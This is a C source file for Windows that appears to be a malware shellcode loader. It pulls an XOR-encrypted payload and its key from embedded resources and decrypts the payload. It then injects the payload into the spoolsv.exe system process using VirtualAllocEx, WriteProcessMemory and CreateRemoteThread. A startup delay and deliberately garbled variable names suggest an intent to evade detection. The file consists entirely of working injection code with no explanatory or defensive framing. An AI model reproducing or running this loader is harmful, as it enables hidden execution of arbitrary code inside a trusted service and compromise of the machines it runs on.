#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>

void loadkumres(const char* rssssame, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}




int main() {
    Sleep(2000);
    
    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    const char *procmantar = "spoolsv.exe";
    Process32First(snapshot, &pe32);
    while(Process32Next(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, procmantar) == 0){
              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID clamonua = VirtualAllocEx(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              for (DWORD ma1su = 0; ma1su < kkcodeLen; ma1su++) {
               kkcode[ma1su] ^= kkeyakesey[ma1su % kkeyakeseyLen]; 
          }
             
              WriteProcessMemory(hProcess, clamonua, kkcode, kkcodeLen, NULL);
             
             

             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)clamonua, NULL, 0, NULL);
             WaitForSingleObject(tHandle, INFINITE);
             
              VirtualFreeEx(hProcess, clamonua, 0, MEM_RELEASE);
           
              CloseHandle(tHandle);
           
              CloseHandle(hProcess);
              
              break;

         }
      }

    return 0;
}
